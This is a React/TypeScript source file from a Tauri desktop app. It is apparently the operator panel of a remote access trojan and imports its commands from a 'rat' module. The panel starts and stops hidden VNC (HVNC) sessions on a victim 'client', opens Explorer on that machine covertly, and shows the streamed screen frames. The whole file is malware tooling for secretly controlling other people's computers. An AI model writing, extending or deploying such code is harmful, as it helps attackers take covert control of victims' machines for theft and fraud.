import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import { manageHVNC } from "../rat/RATCommands";

export const HVNC = () => {
  const { addr } = useParams();

  const [frameData, setFrameData] = useState<string | null>(null);
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);

  useEffect(() => {
    // Listen for HVNC frames from the backend
    const unlisten = listen("hvnc_frame", (event: any) => {
      if (!isConnected) return;
      const payload = event.payload;
      // Only process frames for the current client
      if (payload.addr === addr) {
        const imgData = `data:image/jpeg;base64,${payload.data}`;
        setFrameData(imgData);
        setIsConnected(true);
        setLoading(false);
      }
    });

    return () => {
      // Cleanup listener when component unmounts
      unlisten.then((unlistenFn) => unlistenFn());

      // Stop HVNC when navigating away
      if (isConnected && addr) {
        stopHVNC();
      }
    };
  }, [addr, isConnected]);

  const startHVNC = async () => {
    if (!addr) return;

    setLoading(true);
    try {
      await manageHVNC(addr, "start");
      setIsConnected(true);
    } catch (error) {
      console.error("Failed to start HVNC:", error);
      setLoading(false);
    }

    // Set a timeout to reset loading state if no frames arrive
    setTimeout(() => {
      if (loading) {
        setLoading(false);
      }
    }, 10000);
  };

  const openExplorer = async () => {
    if (!addr || !isConnected) return;

    try {
      await manageHVNC(addr, "open_explorer");
    } catch (error) {
      console.error("Failed to open Explorer:", error);
    }
  };

  const stopHVNC = async () => {
    if (!addr) return;

    try {
      await manageHVNC(addr, "stop");
      setIsConnected(false);
      setFrameData(null);
    } catch (error) {
      console.error("Failed to stop HVNC:", error);
    }
  };

  if (!addr) {
    return (
      <div className="p-6 flex flex-col items-center justify-center h-full">
        <h1 className="text-2xl font-bold mb-4">HVNC</h1>
        <p>No client selected. Please select a client from the clients list.</p>
      </div>
    );
  }

  return (
    <div className="p-6 flex flex-col h-full">
      <div className="flex justify-between items-center mb-4">
        <h1 className="text-2xl font-bold">HVNC - Client {addr}</h1>
        <div className="flex gap-2">
          <button
            className={`px-4 py-2 rounded ${
              isConnected || loading
                ? "bg-gray-300 cursor-not-allowed"
                : "bg-blue-500 text-white hover:bg-blue-600"
            }`}
            disabled={isConnected || loading}
            onClick={startHVNC}
          >
            {loading && (
              <svg
                className="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                ></path>
              </svg>
            )}
            Start HVNC
          </button>
          <button
            className={`px-4 py-2 rounded ${
              !isConnected
                ? "bg-gray-300 cursor-not-allowed"
                : "bg-green-500 text-white hover:bg-green-600"
            }`}
            disabled={!isConnected}
            onClick={openExplorer}
          >
            Open Explorer
          </button>
          <button
            className={`px-4 py-2 rounded ${
              !isConnected
                ? "bg-gray-300 cursor-not-allowed"
                : "bg-red-500 text-white hover:bg-red-600"
            }`}
            disabled={!isConnected}
            onClick={stopHVNC}
          >
            Stop HVNC
          </button>
        </div>
      </div>

      <div className="flex-1 bg-black/10 rounded-lg overflow-hidden flex items-center justify-center border">
        {loading ? (
          <div className="flex flex-col items-center justify-center text-center p-8">
            <svg
              className="animate-spin h-12 w-12 text-gray-500 mb-4"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
              ></circle>
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
              ></path>
            </svg>
            <p>Starting HVNC session...</p>
          </div>
        ) : frameData ? (
          <img
            src={frameData}
            alt="HVNC Display"
            className="max-w-full max-h-full object-contain"
          />
        ) : (
          <div className="text-center p-8">
            <p>No HVNC session active. Click "Start HVNC" to begin.</p>
          </div>
        )}
      </div>
    </div>
  );
};
